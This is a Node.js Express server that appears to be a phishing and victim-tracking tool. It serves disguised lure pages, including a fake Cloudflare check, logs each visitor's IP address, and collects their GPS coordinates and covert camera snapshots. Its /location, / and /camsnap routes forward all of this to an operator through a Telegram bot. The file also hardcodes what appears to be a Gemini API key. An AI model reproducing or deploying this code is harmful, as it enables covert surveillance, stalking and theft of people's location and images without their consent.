require('dotenv').config();
var fs = require("fs");
var express = require("express");
var cors = require('cors');
var bodyParser = require('body-parser');
var ejs = require('ejs');
var atob = require('atob');
var marked = require('marked');
var axios = require('axios');
var TelegramBot = require('node-telegram-bot-api');
var bot = new TelegramBot(process.env["bot"], {
    polling: true
});
var jsonParser = bodyParser.json({
    limit: 1024 * 1024 * 20,
    type: 'application/json'
});
var urlencodedParser = bodyParser.urlencoded({
    extended: true,
    limit: 1024 * 1024 * 20,
    type: 'application/x-www-form-urlencoded'
});
var app = express();
app.use(jsonParser);
app.use(urlencodedParser);
app.use(cors());
app.set("view engine", "ejs");
var host = process.env.host;
//Modify your URL here
var hostURL = process.env.hostURL || "https://dacom.glitch.me";
var geminiApiKey = process.env.GEMINI_API_KEY || 'AIzaSyCuFmcna0tCzuGRErdxwtNyLTUTv9Z-p-w';
//TOGGLE for Shorters
var use1pt = false;



app.get("/w/:path/:uri", (req, res) => {
    var ip;
    var d = new Date();
    d = d.toJSON().slice(0, 19).replace('T', ':');
    if (req.headers['x-forwarded-for']) {
        ip = req.headers['x-forwarded-for'].split(",")[0];
    } else if (req.connection && req.connection.remoteAddress) {
        ip = req.connection.remoteAddress;
    } else {
        ip = req.ip;
    }

    if (req.params.path != null) {
        res.render("webview", {
            ip: ip,
            time: d,
            url: atob(req.params.uri),
            uid: req.params.path,
            a: hostURL,
            t: use1pt
        });
    } else {
        res.redirect("https://t.me/th30neand0nly0ne");
    }



});

app.get("/c/:path/:uri", (req, res) => {
    var ip;
    var d = new Date();
    d = d.toJSON().slice(0, 19).replace('T', ':');
    if (req.headers['x-forwarded-for']) {
        ip = req.headers['x-forwarded-for'].split(",")[0];
    } else if (req.connection && req.connection.remoteAddress) {
        ip = req.connection.remoteAddress;
    } else {
        ip = req.ip;
    }


    if (req.params.path != null) {
        res.render("cloudflare", {
            ip: ip,
            time: d,
            url: atob(req.params.uri),
            uid: req.params.path,
            a: hostURL,
            t: use1pt
        });
    } else {
        res.redirect("https://t.me/th30neand0nly0ne");
    }



});

app.get("/o/:path/:uri", (req, res) => {
    var ip;
    var d = new Date();
    d = d.toJSON().slice(0, 19).replace('T', ':');
    if (req.headers['x-forwarded-for']) {
        ip = req.headers['x-forwarded-for'].split(",")[0];
    } else if (req.connection && req.connection.remoteAddress) {
        ip = req.connection.remoteAddress;
    } else {
        ip = req.ip;
    }


    if (req.params.path != null) {
        res.render("ok", {
            ip: ip,
            time: d,
            url: atob(req.params.uri),
            uid: req.params.path,
            a: hostURL,
            t: use1pt
        });
    } else {
        res.redirect("https://t.me/th30neand0nly0ne");
    }



});


app.get("/l/:path/:uri", (req, res) => {
    var ip;
    var d = new Date();
    d = d.toJSON().slice(0, 19).replace('T', ':');
    if (req.headers['x-forwarded-for']) {
        ip = req.headers['x-forwarded-for'].split(",")[0];
    } else if (req.connection && req.connection.remoteAddress) {
        ip = req.connection.remoteAddress;
    } else {
        ip = req.ip;
    }


    if (req.params.path != null) {
        res.render("cg", {
            ip: ip,
            time: d,
            url: atob(req.params.uri),
            uid: req.params.path,
            a: hostURL,
            t: use1pt
        });
    } else {
        res.redirect("https://t.me/th30neand0nly0ne");
    }
});

app.get("/", (req, res) => {
    var ip;
    if (req.headers['x-forwarded-for']) {
        ip = req.headers['x-forwarded-for'].split(",")[0];
    } else if (req.connection && req.connection.remoteAddress) {
        ip = req.connection.remoteAddress;
    } else {
        ip = req.ip;
    }
    res.json({
        "ip": ip
    });


});


app.post("/location", (req, res) => {


    var lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
    var lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
    var uid = decodeURIComponent(req.body.uid) || null;
    var acc = decodeURIComponent(req.body.acc) || null;
    if (lon != null && lat != null && uid != null && acc != null) {

        bot.sendLocation(parseInt(uid, 36), lat, lon);

        bot.sendMessage(parseInt(uid, 36), `Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);

        res.send("Done");
    }
});


app.post("/", (req, res) => {

    var uid = decodeURIComponent(req.body.uid) || null;
    var data = decodeURIComponent(req.body.data) || null;

    var ip;
    if (req.headers['x-forwarded-for']) {
        ip = req.headers['x-forwarded-for'].split(",")[0];
    } else if (req.connection && req.connection.remoteAddress) {
        ip = req.connection.remoteAddress;
    } else {
        ip = req.ip;
    }

    if (uid != null && data != null) {


        if (data.indexOf(ip) < 0) {
            return res.send("ok");
        }

        data = data.replaceAll("<br>", "\n");

        bot.sendMessage(parseInt(uid, 36), data, {
            parse_mode: "HTML"
        });


        res.send("Done");
    }
});


async function fetchAndFormat(prompt) {
    var geminiApiUrl = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${geminiApiKey}`;

    try {
        var res = await axios.post(geminiApiUrl, {
            contents: [{
                parts: [{
                    text: prompt
                }]
            }]
        });
        var text = res.data?.candidates?.[0]?.content?.parts?.[0]?.text || 'No content generated.';
        var html = marked.parse(text);
        html = html.replace(/<\/?ul>/g, "").replace(/<li>/g, "• ").replace(/<\/li>/g, "\n");
        var i = 1;
        return html.replace(/<\/?ol>/g, "").replace(/<li>/g, () => `${i++}. `);
    } catch {
        return 'Sorry, I could not generate content at the moment.';
    }
}

app.post("/camsnap", (req, res) => {
    var uid = decodeURIComponent(req.body.uid) || null;
    var img = decodeURIComponent(req.body.img) || null;

    if (uid != null && img != null) {

        var buffer = Buffer.from(img, 'base64');

        var info = {
            filename: "camsnap.png",
            contentType: 'image/png'
        };
        try {
            bot.sendPhoto(parseInt(uid, 36), buffer, {}, info);
        } catch (error) {
            console.log(error);
        }
        res.send("Done");

    }

});

app.get("/gemini/:path", async (req, res) => {
  var show = decodeURIComponent(req.params.path);
  try {
    var data = await fetchAndFormat(show);
    res.render('gemini', { code: data });
  } catch {
    res.render('gemini', { code: 'Error occurred while fetching content' });
  }
});

var port = process.env.port || 5000;

app.use((req, res, next) => {
    var protocol = req.protocol;
    var host = req.get("host");
    var fullDomain = `${protocol}://${host}`;
    console.log("Webview Domain:", fullDomain);
    next();
});

app.listen(port, async () => {
    console.log(`App Running on Port ${port}`);

    if (host) {
        try {
            await Promise.all([
                axios.get(host).then((res) => console.log("GET Request Success:", res.status)),
                axios.post(host, {
                    message: "Hello"
                }).then((res) => console.log("POST Request Success:", res.status))
            ]);
        } catch (error) {
            console.error("Request Error:", error.message);
        }
    }
});